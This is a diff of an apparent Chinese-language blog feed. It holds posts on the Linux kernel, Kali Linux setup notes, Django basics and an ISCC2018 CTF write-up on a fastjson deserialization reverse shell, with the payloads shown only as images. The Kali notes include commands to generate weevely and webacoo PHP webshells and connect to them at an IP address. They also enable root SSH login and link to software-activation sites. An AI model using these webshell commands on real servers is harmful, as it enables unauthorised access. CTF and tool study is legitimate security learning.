+    <content type="html"><![CDATA[<pre><code>* 1.Linux体系结构简介* 2.Linux内核源码简介* 3.Linux内核配置、编译、安装</code></pre><h1 id="Linux体系结构简介"><a href="#Linux体系结构简介" class="headerlink" title="Linux体系结构简介"></a>Linux体系结构简介</h1><h2 id="Linux体系结构（linux系统构成）"><a href="#Linux体系结构（linux系统构成）" class="headerlink" title="Linux体系结构（linux系统构成）"></a>Linux体系结构（linux系统构成）</h2><p>Linux可以分为两部分，分别为用户空间和内核空间具体如下图：<br><img src="\images\pasted-290.png" alt="upload successful"><br>用户空间包括：用户的应用程序、C库<br>内核空间包括：系统调用接口、内核（狭义内核）、平台架构相关的代码</p><h2 id="为什么要分为内核空间和用户空间"><a href="#为什么要分为内核空间和用户空间" class="headerlink" title="为什么要分为内核空间和用户空间"></a>为什么要分为内核空间和用户空间</h2><p>我们在分析u-boot的时候就说到过，我们的cpu在不同的工作模式下可以访问的寄存器是不一样的，所以为了保护我们的操作系统，避免用户程序将内核搞崩，所以进行了内核空间和用户空间的划分。<br>Arm处理器工作模式划分：usr、FIQ、IRQ、svc、abt、und、sys（具体介绍在<a href="http://www.cnblogs.com/wrjvszq/p/4199682.html）" target="_blank" rel="noopener">http://www.cnblogs.com/wrjvszq/p/4199682.html）</a><br>X86处理器工作模式划分：Ring0—Ring3，Ring0下可以执行特权指令，可以访问IO设备，Ring3则有很多的限制注：我们可以通过系统调用和硬件中断来完成用户空间到内核空间的转移</p><h2 id="Linux内核结构（广义内核）"><a href="#Linux内核结构（广义内核）" class="headerlink" title="Linux内核结构（广义内核）"></a>Linux内核结构（广义内核）</h2><p>Linux内核由七个部分构成，具体如下图：<br><img src="\images\pasted-291.png" alt="upload successful"><br>系统调用接口（SCI）：open、read、write等系统调用<br>进程管理（PM）：创建进程、删除进程、调度进程等<br>内存管理（MM）：内存分配、管理等<br>虚拟文件系统（VFS）：为多种文件系统提供统一的操作接口<br>网络协议栈：提供各种网络协议<br>CPU架构相关代码（Arch）：为的是提高至移植性<br>设备驱动程序（DD）：各种设备驱动，占到内核的70%左右代码</p><h1 id="Linux内核源码简介"><a href="#Linux内核源码简介" class="headerlink" title="Linux内核源码简介"></a>Linux内核源码简介</h1><h2 id="源码获取"><a href="#源码获取" class="headerlink" title="源码获取"></a>源码获取</h2><p>Linux内核获取有两种方法，一种是在<a href="http://www.kernel.org" target="_blank" rel="noopener">www.kernel.org</a> 直接获取，另一种是使用git获取（具体方法参考网络）。  </p><h2 id="源码目录简介"><a href="#源码目录简介" class="headerlink" title="源码目录简介"></a>源码目录简介</h2><p>其源码主要有以下目录（介绍重要目录）：<br>Arch目录：存放处理器相关的代码。下设子目录，分别对应具体的CPU，每个子目录有boot，mm，以及kernel三个子目录，分别对应系统引导以及存储管理，和系统调用<br>Include目录：内核所需要的大部分头文件目录。与平台无关的在include/linux子目录下，与平台相关的则放在include相应的子目录中。<br>fs目录：存放各种文件系统的实现代码。<br>init目录：init子目录包含核心的初始化代码（不是系统的引导代码）。其包含两个文件main.c和version.c，可以用来研究核心如何工作。<br>ipc目录：包含核心进程间的通信代码。<br>kernel目录：包含内核管理的核心代码。与硬件相关代码放在arch/<em>/kernel目录下。<br>mm目录：包含了所有的内存管理代码。与硬件相关的内存管理代码位于arch/</em>/mm目录下。<br>scripts目录：包含用于配置核心的脚本文件。<br>lib目录：包含了核心的库代码，与硬件相关的库代码被放在arch/*/lib/目录下  </p><h1 id="Linux内核配置、编译、安装"><a href="#Linux内核配置、编译、安装" class="headerlink" title="Linux内核配置、编译、安装"></a>Linux内核配置、编译、安装</h1><h2 id="X86配置"><a href="#X86配置" class="headerlink" title="X86配置"></a>X86配置</h2><p>Linux内核的编译有两种方法，具体如下：<br>交互式：在内核顶层的目录下运行make config，按照提示一步一步的按照自己的需求对内核进行配置。<br>菜单式：在内核顶层的目录下运行make menuconfig，菜单式的按照自己的需求对内核进行配置。  </p><h2 id="X86编译"><a href="#X86编译" class="headerlink" title="X86编译"></a>X86编译</h2><p>Linux内核的编译要经过以下步骤，具体如下：  </p><ul><li>内核编译：linux内核的编译有以下两种方法。<br><strong>make zImage：</strong>编译出的内核小于512k（老版本内核）<br><strong>make bzImage：</strong>通用编译命令注：在以上两个命令中加V=1可查看编译过程中的详细信息  </li><li>内核模块编译：执行make modules编译内核模块。  </li><li>内核模块安装：执行make modules_install将编译好的内核模块复制到当前系统的/lib/modules下的<em> </em>目录下。  </li><li>内核模块打包：执行mkinitrd initrd-$version $version对内核模块进行打包，其中initrd-$version表示要打包为的文件的名字，$version表示要打包的目录即我们上一步生成的目录。  </li></ul><p>X86安装Linux内核的安装要经过以下步骤，具体如下：  </p><ul><li>拷贝内核：复制1编译出来的内核映像到启动目录cp arch/$cpu/boot/bzImage（1编译出来的bzimage）/boot/vmlinuz-$version  </li><li>拷贝内核模块文件：执行cp initrd-$version（4生成的文件） /boot/ 将4生成的文件拷贝到boot下  </li><li>修改启动配置文件：修改/etc/grub.conf文件<br><br><br><br></li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;pre&gt;&lt;code&gt;* 1.Linux体系结构简介
+* 2.Linux内核源码简介
+* 3.Linux内核配置、编译、安装
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;Linux体系结构简介&quot;&gt;&lt;a href=&quot;#Linux体系结构简介&quot; class=&quot;headerlink&quot; t
+      
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://yoururl.com/categories/Linux/"/>
+    
+      <category term="Linux内核分析" scheme="http://yoururl.com/categories/Linux/Linux%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"/>
+    
+    
+      <category term="linux内核" scheme="http://yoururl.com/tags/linux%E5%86%85%E6%A0%B8/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>kali linux安装配置</title>
+    <link href="http://yoururl.com/2018/10/16/kali-linux%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"/>
+    <id>http://yoururl.com/2018/10/16/kali-linux安装配置/</id>
+    <published>2018-10-16T12:42:00.000Z</published>
+    <updated>2018-10-16T18:45:18.366Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="U盘给物理机装kali的一些问题："><a href="#U盘给物理机装kali的一些问题：" class="headerlink" title="U盘给物理机装kali的一些问题："></a>U盘给物理机装kali的一些问题：</h1><p><strong><a href="https://www.jianshu.com/p/27ca274b70c8" target="_blank" rel="noopener">安装教程</a></strong>  </p><ul><li>挂载不了u盘：<br>用dd命令直接在linux下把kali的镜像文件刻录进U盘<br>dd if=xxx.iso of=/dev/sdb bs=4M  </li><li>安装系统失败：<br>图形界面安装，分区全分给一个盘(sda)  </li><li>Debootstart错误 无法确定发布代号<br>分区表错误，重新格式化硬盘，重建分区表  </li><li>安装GRUB失败<br>iso的一个bug，64位镜像的话插网线，联网装。32位没事<br><br><br><br></li></ul><h1 id="更新源一些问题："><a href="#更新源一些问题：" class="headerlink" title="更新源一些问题："></a>更新源一些问题：</h1><h2 id="无法验证下列签名"><a href="#无法验证下列签名" class="headerlink" title="无法验证下列签名"></a>无法验证下列签名</h2><p>Ubuntu：apt-get update出错：由于没有公钥，无法验证下列签名<br><a href="https://jingyan.baidu.com/article/2d5afd69ec4cce85a2e28ef9.html" target="_blank" rel="noopener">解决方法</a><br><img src="\images\pasted-288.png" alt="upload successful"><br>sudo apt-key adv –recv-keys –keyserver keyserver.Ubuntu.com 7E5FA1EE  </p><h2 id="签名过期"><a href="#签名过期" class="headerlink" title="签名过期:"></a>签名过期:</h2><p>wget -q -O - <a href="https://archive.kali.org/archive-key.asc" target="_blank" rel="noopener">https://archive.kali.org/archive-key.asc</a> | apt-key add</p><h2 id="明文签署文件不可用"><a href="#明文签署文件不可用" class="headerlink" title="明文签署文件不可用"></a>明文签署文件不可用</h2><p>解决方法：换个源更新</p><pre><code>#中科大  deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib  deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib  </code></pre><p>然后执行命令:  </p><pre><code>apt-get update                 #更新系统apt-get upgrade                #升级系统apt-get dist-upgrade           #升级系统(自选)apt-get clean                  #删除/var/cache/apt/archives/ 和 /var/cache/apt/archives/partial/目录下所有包(锁定的除外)</code></pre><p><strong>upgrade和dist-upgrade的差别:</strong>  </p><ul><li>upgrade:系统将现有的Package升级,如果有相依性的问题,而此相依性需要安装其它新的Package或影响到其它Package的相依性时,此Package就不会被升级,会保留下来.  </li><li>dist-upgrade:可以聪明的解决相依性的问题,如果有相依性问题,需要安装/移除新的Package,就会试着去安装/移除它.<br>(所以通常这个会被认为是有点风险的升级)<br><br><br><br></li></ul><h1 id="kali无法正常上网"><a href="#kali无法正常上网" class="headerlink" title="kali无法正常上网"></a>kali无法正常上网</h1><p><a href="https://blog.csdn.net/chenyanhui1087/article/details/53127884" target="_blank" rel="noopener">解决办法</a><br><br><br><br></p><h1 id="kali设置固定ip"><a href="#kali设置固定ip" class="headerlink" title="kali设置固定ip"></a>kali设置固定ip</h1><p>/etc/network下的interfaces文件，打开后可以看到eth0为dhcp，将其修改为如下形式：</p><pre><code>auto eth0iface eth0 inet static //配置eth0使用默认的静态地址address 192.168.77.133 //设置eth0的IP地址netmask 255.255.255.0 //配置eth0的子网掩码gateway 192.168.77.254 //配置当前主机的默认网关</code></pre><p>配置DNS：  /etc/resovl.conf　　</p><pre><code>domainnameserver 10.10.10.10nameserver 102.54.16.2</code></pre><p>完成后保存，然后在终端里边重启网络：</p><pre><code>/etc/init.d/networking restart</code></pre><p><br><br><br></p><h1 id="kali安装中文输入法"><a href="#kali安装中文输入法" class="headerlink" title="kali安装中文输入法"></a>kali安装中文输入法</h1><pre><code>apt-get install fcitxapt-get install fcitx-googlepinyininit 6</code></pre><p><br><br><br></p><h1 id="kali安装flash-player"><a href="#kali安装flash-player" class="headerlink" title="kali安装flash player"></a>kali安装flash player</h1><p>在地址栏输入网址<a href="https://get.adobe.com/flashplayer/?loc=cn，下载Linux版本的tar.gz文件。" target="_blank" rel="noopener">https://get.adobe.com/flashplayer/?loc=cn，下载Linux版本的tar.gz文件。</a><br>打开终端，并切换到下载文件所在目录，执行以下命令：  </p><pre><code>tar xzvf install_flash_player_11_linux.x86_64.tar.gz</code></pre><p>进入解压出来的文件夹，找到libflashplayer.so拷贝到/usr/lib/mozilla/plugins/下，命令如下：  </p><pre><code>cp libflashplayer.so /usr/lib/mozilla/plugins/</code></pre><p><br><br><br></p><h1 id="kali安装百度云"><a href="#kali安装百度云" class="headerlink" title="kali安装百度云"></a>kali安装百度云</h1><pre><code>dpkg -i bcloud-x.x.x.deb apt-get -f install</code></pre><p><br><br><br></p><h1 id="kali安装WPS"><a href="#kali安装WPS" class="headerlink" title="kali安装WPS"></a>kali安装WPS</h1><p><a href="https://blog.csdn.net/github_39217805/article/details/73465999" target="_blank" rel="noopener">参考</a>  </p><pre><code>dpkg -i x.x.x.deb apt-get -f installgdebi</code></pre><p><br><br><br></p><h1 id="kali安装sublime"><a href="#kali安装sublime" class="headerlink" title="kali安装sublime"></a>kali安装sublime</h1><p><a href="https://blog.csdn.net/youngdze/article/details/19980009" target="_blank" rel="noopener">安装</a><br><a href="https://blog.csdn.net/qq_29819449/article/details/80130327" target="_blank" rel="noopener">注册</a><br><br><br><br></p><h1 id="kali安装pycharm"><a href="#kali安装pycharm" class="headerlink" title="kali安装pycharm"></a>kali安装pycharm</h1><p><a href="https://www.jianshu.com/p/11d70cecbfff" target="_blank" rel="noopener">下载和安装</a><br><a href="https://blog.csdn.net/qq_36472696/article/details/75637163?locationNum=5&amp;fps=1" target="_blank" rel="noopener">Linux下将pycharm图标添加至桌面</a><br><a href="https://blog.csdn.net/xjcvip007/article/details/52606193" target="_blank" rel="noopener">设置桌面快捷方式</a><br><a href="https://blog.csdn.net/u014044812/article/details/78727496" target="_blank" rel="noopener">激活</a><br>设置快捷键为pycharm:<br>ln -s /root/下载/pycharm/bin/pycharm.sh /usr/bin/pycharm<br><a href="http://idea.lanyus.com/" target="_blank" rel="noopener">IDEA注册码</a><br><br><br><br></p><h1 id="kali的firefox设置成中文"><a href="#kali的firefox设置成中文" class="headerlink" title="kali的firefox设置成中文"></a>kali的firefox设置成中文</h1><p><a href="https://blog.csdn.net/xingjiarong/article/details/49449015" target="_blank" rel="noopener">参考</a><br><br><br><br></p><h1 id="kali下webshell管理工具"><a href="#kali下webshell管理工具" class="headerlink" title="kali下webshell管理工具"></a>kali下webshell管理工具</h1><h2 id="webacoo"><a href="#webacoo" class="headerlink" title="webacoo"></a>webacoo</h2><p>没有密码，只能用于php  </p><ul><li>生成服务端程序<br>webacoo -g -o a.php  </li><li>客户端连接<br>webacoo -t -u <a href="http://202.196.73.125/a.php" target="_blank" rel="noopener">http://202.196.73.125/a.php</a>   </li></ul><h2 id="Weevely"><a href="#Weevely" class="headerlink" title="Weevely"></a>Weevely</h2><ul><li>~# weevely generate <password> b.php  </password></li><li>~# cat /usr/share/weevely/b.php  </li><li>客户端连接：weevely <a href="http://202.196.73.125/b.php" target="_blank" rel="noopener">http://202.196.73.125/b.php</a> pass<br><br><br><br></li></ul><h1 id="kali安装nessus"><a href="#kali安装nessus" class="headerlink" title="kali安装nessus"></a>kali安装nessus</h1><p><a href="https://blog.csdn.net/u012318074/article/details/72354387?locationNum=13&amp;fps=1" target="_blank" rel="noopener">参考</a><br><a href="https://www.cnblogs.com/youcanch/articles/5671238.html" target="_blank" rel="noopener">使用</a><br>在安装注册过程的4步，常常出现“Plugin Download Fail”问题，这个时候可以采用离线加载继续安装。下载离线安装包all-2.0.tar.gz并将它拷贝到nessus的安装目录下，在命令提示符下切换到nessus的安装目录下输入如下命令（此过程十分漫长情耐心等待）<br>nessuscli update all-2.0.tar.gz<br><br><br><br></p><h1 id="kali下wine中文乱码"><a href="#kali下wine中文乱码" class="headerlink" title="kali下wine中文乱码"></a>kali下wine中文乱码</h1><p><a href="https://blog.csdn.net/williamyi96/article/details/79841690" target="_blank" rel="noopener">参考</a><br><br><br><br></p><h1 id="kali安装docker"><a href="#kali安装docker" class="headerlink" title="kali安装docker"></a>kali安装docker</h1><p><a href="http://blog.csdn.net/u014057054/article/details/72510898" target="_blank" rel="noopener">参考</a><br><br><br><br></p><h1 id="kali安装virtualbox"><a href="#kali安装virtualbox" class="headerlink" title="kali安装virtualbox"></a>kali安装virtualbox</h1><pre><code>1、添加源：Add the following line to your /etc/apt/sources.list:deb http://download.virtualbox.org/virtualbox/debian artful contrib2、添加公钥wget -q https://www.virtualbox.org/download/oracle_vbox_2016.asc -O- | sudo apt-key add -wget -q https://www.virtualbox.org/download/oracle_vbox.asc -O- | sudo apt-key add -3、更新并安装sudo apt-get updatesudo apt-get install virtualbox</code></pre><p><br><br><br></p><h1 id="kali下设置shadowsocks翻墙"><a href="#kali下设置shadowsocks翻墙" class="headerlink" title="kali下设置shadowsocks翻墙"></a>kali下设置shadowsocks翻墙</h1><p><a href="https://blog.csdn.net/szsteel1/article/details/54773544?utm_medium=referral&amp;utm_source=itdadao" target="_blank" rel="noopener">参考</a></p><pre><code>/etc/init.d/shadowsockes restart      #重启服务vim /home/lalala/shadowsocks.json     #配置服务端信息sslocal -c /home/lalala/shadowsocks.json -d start     #开启客户端vim /etc/proxychains.conf #注释掉socks4，添加socks5 127.0.0.1 1080     #配置proxychainsproxychains curl www.google.com 测试</code></pre><p><br><br><br></p><h1 id="kali设置Tor"><a href="#kali设置Tor" class="headerlink" title="kali设置Tor"></a>kali设置Tor</h1><p><a href="https://blog.csdn.net/qq_37867887/article/details/75675120" target="_blank" rel="noopener">安装教程</a><br><a href="https://blog.csdn.net/guangyinglanshan/article/details/77236420" target="_blank" rel="noopener">root下无法执行</a><br><br><br><br></p><h1 id="kali安装ftp服务器"><a href="#kali安装ftp服务器" class="headerlink" title="kali安装ftp服务器"></a>kali安装ftp服务器</h1><p><a href="https://www.douban.com/note/415638303/" target="_blank" rel="noopener">参考</a><br><a href="https://wenku.baidu.com/view/6b25c70f1ed9ad51f01df278.html" target="_blank" rel="noopener">创建用户及设置</a><br><br><br><br></p><h1 id="kali添加环境变量"><a href="#kali添加环境变量" class="headerlink" title="kali添加环境变量"></a>kali添加环境变量</h1><p><a href="https://www.cnblogs.com/Bonker/p/4314576.html" target="_blank" rel="noopener">参考</a><br><br><br><br></p><h1 id="kali安装配置Redis"><a href="#kali安装配置Redis" class="headerlink" title="kali安装配置Redis"></a>kali安装配置Redis</h1><p><a href="https://blog.csdn.net/qq_41298906/article/details/78819447" target="_blank" rel="noopener">参考</a><br><br><br><br></p><h1 id="VMware给kali扩容"><a href="#VMware给kali扩容" class="headerlink" title="VMware给kali扩容"></a>VMware给kali扩容</h1><p><a href="http://blog.51cto.com/liwenhn/1937411" target="_blank" rel="noopener">gparted</a><br><br><br><br></p><h1 id="kali下开启sftp传文件"><a href="#kali下开启sftp传文件" class="headerlink" title="kali下开启sftp传文件"></a>kali下开启sftp传文件</h1><pre><code>service ssh start #开启ssh服务SSH服务器拒绝了密码，ssh连不上kali因为sshd的默认设置不允许root用户用密码远程登录修改 vim /etc/ssh/sshd_config找到# Authentication:LoginGraceTime 120PermitRootLogin without passwdStrictModes yes改成:Authentication:    LoginGraceTime 120PermitRootLogin yesStrictModes yes重启虚拟机</code></pre><h2 id="Xshell连接sftp传文件"><a href="#Xshell连接sftp传文件" class="headerlink" title="Xshell连接sftp传文件"></a>Xshell连接sftp传文件</h2><pre><code>在本地提示下以sftp命令登陆拟要发送文件的主机。    Xshell:\&gt; sftp hostname在sftp提示下以put命令发送需要的文件。    sftp:/home/user21&gt;put filename在sftp提示下以get命令接收需要的文件。    sftp:/home/user21&gt;get filename</code></pre><h2 id="cmd连接sftp传文件"><a href="#cmd连接sftp传文件" class="headerlink" title="cmd连接sftp传文件"></a>cmd连接sftp传文件</h2><p>【控制面板】-【程序】-【打开或关闭Windows功能】，弹出Windows功能窗口，里面有个tftp客户端。在前面打勾确定。然后在cmd里就可以使用sftp了。<br>C:\Users\ramma&gt;sftp server<br>user name :<br><img src="\images\pasted-289.png" alt="upload successful"><br><br><br><br></p><h1 id="其他安装"><a href="#其他安装" class="headerlink" title="其他安装"></a>其他安装</h1><p>   apt-get install audacious                #audacious音乐播放器<br>   apt-get install smplayer                 #安装smplayer视频播放器<br>   apt-get install synaptic                  #安装新立德<br><br><br><br></p><h1 id="个人常用快捷键"><a href="#个人常用快捷键" class="headerlink" title="个人常用快捷键"></a>个人常用快捷键</h1><pre><code>alt+enter          开终端    gnome-terminal  supur+enter        开浏览器  ctrl+ enter        主目录  alt+f              搜索  supur+d            回到桌面(隐藏所有正常窗口)  ctrl + alt +A      截图</code></pre><p><br><br><br></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;U盘给物理机装kali的一些问题：&quot;&gt;&lt;a href=&quot;#U盘给物理机装kali的一些问题：&quot; class=&quot;headerlink&quot; title=&quot;U盘给物理机装kali的一些问题：&quot;&gt;&lt;/a&gt;U盘给物理机装kali的一些问题：&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;&lt;a
+      
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://yoururl.com/categories/Linux/"/>
+    
+    
+      <category term="kali" scheme="http://yoururl.com/tags/kali/"/>
+    
+  </entry>
   
   <entry>
     <title>Linux内核漏洞利用</title>
@@ -374,236 +607,6 @@
       <category term="python" scheme="http://yoururl.com/tags/python/"/>
     
       <category term="django" scheme="http://yoururl.com/tags/django/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>1_Django概述</title>
-    <link href="http://yoururl.com/2018/07/28/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-1/"/>
-    <id>http://yoururl.com/2018/07/28/Django学习笔记-1/</id>
-    <published>2018-07-28T02:59:00.000Z</published>
-    <updated>2018-08-02T17:45:50.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h1><p>Django安装：pip install django==1.10.3<br>安装前段框架Bootstrap3，利用其结合Django开发Web页面：  pip install django-bootstrap3<br>使用PyMysql连接mysql数据库：  pip install PyMySQL<br><br><br><br></p><h1 id="Django框架介绍"><a href="#Django框架介绍" class="headerlink" title="Django框架介绍"></a>Django框架介绍</h1><p>&emsp;&emsp;Django是一个基于MVC构造的框架。但是在Django中，控制器接受用户输入的部分由框架自行处理，所以 Django 里更关注的是模型（Model）、模板(Template)和视图（Views），称为 MVT模式。它们各自的职责如下：</p><table><thead><tr><th>层次</th><th>职责</th></tr></thead><tbody><tr><td>模型（Model），即数据存取层</td><td>处理与数据相关的所有事务： 如何存取、如何验证有效性、包含哪些行为以及数据之间的关系等。  </td></tr><tr><td>模板(Template)，即业务逻辑层</td><td>处理与表现相关的决定： 如何在页面或其他类型文档中进行显示。</td></tr><tr><td>视图（View），即表现层</td><td>存取模型及调取恰当模板的相关逻辑。模型与模板的桥梁。</td></tr></tbody></table><p>&emsp;&emsp;从以上表述可以看出Django 视图不处理用户输入，而仅仅决定要展现哪些数据给用户，而Django 模板 仅仅决定如何展现Django视图指定的数据。或者说, Django将MVC中的视图进一步分解为 Django视图 和 Django模板两个部分，分别决定 “展现哪些数据” 和 “如何展现”，使得Django的模板可以根据需要随时替换，而不仅仅限制于内置的模板。</p><p>&emsp;&emsp;至于MVC控制器部分，由Django框架的URLconf来实现。URLconf机制是使用正则表达式匹配URL，然后调用合适的Python函数。URLconf对于URL的规则没有任何限制，你完全可以设计成任意的URL风格，不管是传统的，RESTful的，或者是另类的。框架把控制层给封装了，无非与数据交互这层都是数据库表的读,写,删除,更新的操作。在写程序的时候，只要调用相应的方法就行了，感觉很方便。程序员把控制层东西交给Django自动完成了。 只需要编写非常少的代码完成很多的事情。所以，它比MVC框架考虑的问题要深一步，因为我们程序员大都在写控制层的程序。现在这个工作交给了框架，仅需写很少的调用代码，大大提高了工作效率。</p><h2 id="web框架"><a href="#web框架" class="headerlink" title="web框架"></a>web框架</h2><p><img src="\images\pasted-71.png" alt="upload successful"></p><h2 id="什么是ORM？"><a href="#什么是ORM？" class="headerlink" title="什么是ORM？"></a>什么是ORM？</h2><p><img src="\images\pasted-72.png" alt="upload successful"></p><h2 id="Django框架"><a href="#Django框架" class="headerlink" title="Django框架"></a>Django框架</h2><p>&emsp;&emsp;目录分开，就必须有机制将他们在内里进行耦合。在Django中，urls、orm、static、settings等起着重要的作用。一个典型的业务流程是如下图所示：<br><img src="\images\pasted-70.png" alt="upload successful"><br>&emsp;&emsp;Django是一个基于MVC构造的框架。但是在Django中，控制器接受用户输入的部分由框架自行处理，所以 Django 里更关注的是模型（Model）、模板(Template)和视图（Views），称为 MTV模式。<br><br><br><br></p><h1 id="Django优点"><a href="#Django优点" class="headerlink" title="Django优点"></a>Django优点</h1><ul><li>强大的数据库功能<br>    用 python 的类继承，几行代码就可以拥有一个丰富、动态的数据库操作接口（API），如果需要，你也能执行 SQL 语句ORM（Object-Relational-Mapping“对象-关系-映射”），它实现了数据模型与数据库的解耦，即数据模型的设计不需要依赖于特定的数据库，通过简单的配置就可以轻松更换数据库。</li><li>自带强大的后台功能<br>    几行代码就让网站拥有一个强大的后台，轻松管理内容。</li><li>优雅的网址<br>    在urls.py中用正则匹配网址，传递到对应的函数。(需要注意的是:正则是一种独立的语法，并不是哪个语言所拥有的。)</li><li>具有模板系统<br>    强大，易扩展的模板系统，设计简易，代码和样式分开设计，更易管理。</li><li>缓存系统<br>&emsp;&emsp;Django和memcached、redis或者其他的缓存系统联用，表现更出色，提高了页面的加载速度。<br>&emsp;&emsp;templates 文件夹views.py 中的函数渲染 templates 中的 Html 模板，得到动态内容的网页，当然可以用缓存来提高速度。</li><li>国际化<br>    完全支持多语言应用，允许你定义翻译的字符，轻松翻译成不同国家的语言。<br><br><br><br></li></ul><h1 id="Django基本操作"><a href="#Django基本操作" class="headerlink" title="Django基本操作"></a>Django基本操作</h1><h2 id="创建项目-test1"><a href="#创建项目-test1" class="headerlink" title="创建项目(test1)"></a>创建项目(test1)</h2><p>django-admin startproject test1<br><img src="\images\pasted-73.png" alt="upload successful"></p><h2 id="创建应用-booktest"><a href="#创建应用-booktest" class="headerlink" title="创建应用(booktest)"></a>创建应用(booktest)</h2><p>python manage.py startapp booktest<br><img src="\images\pasted-74.png" alt="upload successful"></p><h2 id="创建更改的文件-（生成迁移）"><a href="#创建更改的文件-（生成迁移）" class="headerlink" title="创建更改的文件 （生成迁移）"></a>创建更改的文件 （生成迁移）</h2><p>python manage.py makemigrations </p><h2 id="将生成的py文件应用到数据库-（执行迁移）"><a href="#将生成的py文件应用到数据库-（执行迁移）" class="headerlink" title="将生成的py文件应用到数据库 （执行迁移）"></a>将生成的py文件应用到数据库 （执行迁移）</h2><p>python manage.py migrate</p><h2 id="创建一个管理员用户（按提示输入用户名，邮箱，密码）"><a href="#创建一个管理员用户（按提示输入用户名，邮箱，密码）" class="headerlink" title="创建一个管理员用户（按提示输入用户名，邮箱，密码）"></a>创建一个管理员用户（按提示输入用户名，邮箱，密码）</h2><p>python manage.py createsuperuser</p><h2 id="运行（可以指定ip地址和端口号）"><a href="#运行（可以指定ip地址和端口号）" class="headerlink" title="运行（可以指定ip地址和端口号）"></a>运行（可以指定ip地址和端口号）</h2><p>#python manage.py runserver 127.0.0.1:8001</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;环境安装&quot;&gt;&lt;a href=&quot;#环境安装&quot; class=&quot;headerlink&quot; title=&quot;环境安装&quot;&gt;&lt;/a&gt;环境安装&lt;/h1&gt;&lt;p&gt;Django安装：pip install django==1.10.3&lt;br&gt;安装前段框架Bootstrap3，利用其结合D
-      
-    
-    </summary>
-    
-      <category term="Django学习笔记" scheme="http://yoururl.com/categories/Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    
-      <category term="python" scheme="http://yoururl.com/tags/python/"/>
-    
-      <category term="django" scheme="http://yoururl.com/tags/django/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ISCC2018线下赛总结</title>
-    <link href="http://yoururl.com/2018/06/26/ISCC2018%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
-    <id>http://yoururl.com/2018/06/26/ISCC2018线下赛总结/</id>
-    <published>2018-06-25T17:22:00.000Z</published>
-    <updated>2018-06-26T02:46:44.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h1><p>先拿自己靶机，攻下高地，进入公共区域攻防<br>这次比赛打得非常差，赛后又重新自己复现了一下，emmm大概是这个样子的<br>给了一个环境，是Tomcat，开了8080端口<br><img src="\images\pasted-57.png" alt="upload successful"></p><p>比赛信息是192.168.43.70/whatisyourname/，这里用到了<strong>fastjson反序列化漏洞</strong>，熟悉Java的同学应该能看出来(但我是真的看不出来（╯－＿－）╯╧╧ )<br><img src="\images\pasted-58.png" alt="upload successful"><br><br><br></p><h1 id="fastjson反序列化漏洞参考："><a href="#fastjson反序列化漏洞参考：" class="headerlink" title="fastjson反序列化漏洞参考："></a>fastjson反序列化漏洞参考：</h1><p><a href="https://blog.csdn.net/yaofeino1/article/details/76377080" target="_blank" rel="noopener">https://blog.csdn.net/yaofeino1/article/details/76377080</a><br><a href="https://github.com/iBearcat/Fastjson-Payload" target="_blank" rel="noopener">https://github.com/iBearcat/Fastjson-Payload</a><br><a href="https://github.com/shengqi158/fastjson-remote-code-execute-poc" target="_blank" rel="noopener">https://github.com/shengqi158/fastjson-remote-code-execute-poc</a><br><br><br><br></p><h1 id="环境源码下载"><a href="#环境源码下载" class="headerlink" title="环境源码下载"></a>环境源码下载</h1><p>通过github下载含有漏洞环境的web源代码<a href="https://raw.githubusercontent.com/yaofeifly/vulhub/master/fastjson/vuln/fastjson-1.0.war" target="_blank" rel="noopener">下载地址</a><br>直接将war包放到tomcat的webapp目录下，运行tomcat就行：<br><img src="\images\pasted-66.png" alt="upload successful"><br><br><br></p><h1 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h1><p>通过浏览器访问环境URL，利用burpsuite对数据包进行拦截，修改数据包发送方式并且插入POST数据<br><strong>{“name”:”feifei”,age:12}</strong> ，查看效果：<br><img src="\images\pasted-59.png" alt="upload successful"><br>然后根据参考文献找到Test.java文件<br>构造poc(<strong><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">反弹shell</a></strong>)，编译一下<br><img src="\images\pasted-60.png" alt="upload successful"><br>生成.class文件<br><img src="\images\pasted-61.png" alt="upload successful"><br>base64 encode一下<br><img src="\images\pasted-62.png" alt="upload successful"><br>替换name字段，post过去<br><img src="\images\pasted-63.png" alt="upload successful"><br>可以看到命令执行成功<br><img src="\images\pasted-64.png" alt="upload successful"><br>nc连接上执行命令<br><img src="\images\pasted-65.png" alt="upload successful"><br>然后就是执行主办方给的getflag命令就可以打了，当时不知道什么原因环境命令执行有时能成功有时不成功≡￣﹏￣≡<br>nc也死活连不上<br>说到底还是自己好菜，对基础的东西理解还是不扎实，还是要多总结多刷题以赛代练，希望自己能进步的快一点　&lt;(￣ c￣)y▂ξ</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;环境介绍&quot;&gt;&lt;a href=&quot;#环境介绍&quot; class=&quot;headerlink&quot; title=&quot;环境介绍&quot;&gt;&lt;/a&gt;环境介绍&lt;/h1&gt;&lt;p&gt;先拿自己靶机，攻下高地，进入公共区域攻防&lt;br&gt;这次比赛打得非常差，赛后又重新自己复现了一下，emmm大概是这个样子的&lt;br
-      
-    
